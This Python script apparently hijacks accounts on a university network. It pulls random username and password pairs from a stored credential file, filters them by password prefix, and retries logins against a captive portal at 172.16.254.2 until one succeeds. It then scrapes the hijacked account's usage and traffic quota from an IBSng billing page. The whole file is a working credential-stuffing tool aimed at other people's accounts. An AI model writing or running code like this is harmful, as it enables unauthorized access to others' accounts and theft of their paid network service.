import random
import csv
import os
import requests
import time
import re
f=open("dtbs/ac.db",'r')
username,password,usage,traffic,c = 0,0,0,0,0

def confirm():
    input('\n\nIf u wanna change account press Enter...')
    #logoutreq = requests.get('http://172.16.254.2/logout')
    os.system('cls')
    #test()	

def info():
    global username,password,usage,traffic
    infodata = {'normal_username': username, 'normal_password': password}
    inforeq = requests.post('http://172.16.16.1/IBSng/user/', data=infodata)
    import html2text
    html = html2text.html2text(inforeq.text)
    for line in html.split("\n"):
        if "This" in line:
            usage = line.split("|")
            print(usage[1],usage[2])
        if "Monthly Traffic Limit" in line:
            traffic = line.split('|')
            print (traffic[1],traffic[2])
            r = re.compile("([a-zA-Z]+)([0-9]+)")
            


def getup():
    global username,password
    offset=random.randrange(0,476)
    offset= offset*21
    f.seek(offset)
    f.readline()
    random_line=f.readline()
    username,password = random_line.split(",")
    password = password.strip()
    global c
    c += 1
    print('Try Count: ', c)
    print("Try to Login with ", username)
    if password[:3] == "136":
        return username,password
    else:
        print ("\nFailed!\nReason: Not Tabrizian!\n####################\n\n\nTry Again...")
        time.sleep(0.0)
        os.system('cls')
    return 0,0

def login():

    username,password=getup()
    while (username == 0):
        username,password=getup()
    data = {'username': username, 'password': password}
    r = requests.post('http://172.16.254.2/login', data=data)
    import html2text
    html = html2text.html2text(r.text)
    
    return html

def test():
    html=login()
    if "Wrong password" in html:
        print("\nFailed!\nReason: Wrong Password\n####################\n\n\nTry Again...")
        time.sleep(0.0)
        os.system('cls')
        test()
    if "Maximum number of concurrent logins reached" in html:
        print("Failed!\nReason: Max Number\n####################\n\n\nTry Again:")
        time.sleep(0.0)
        os.system('cls')
        test()

    if "does not exists" in html:
        print("\nFailed!\nReason: This username does not exists\n####################\n\n\nTry Again...")
        time.sleep(0.0)
        os.system('cls')
        test()
    if "User Traffic quota has exceeded" in html:
        print("\nFailed!\nReason: User Traffic quota has exceeded\n####################\n\n\nTry Again...")
        time.sleep(0.0)
        os.system('cls')
        test()
    if "If nothing happens," in html:
        print("\n\n\n##################################################")
        print("################>  Logged IN!!  <#################")
        print("##################################################\n\n\n")
        info()
        time.sleep(0.5)    # pause 
        confirm()
        f.close()



#test()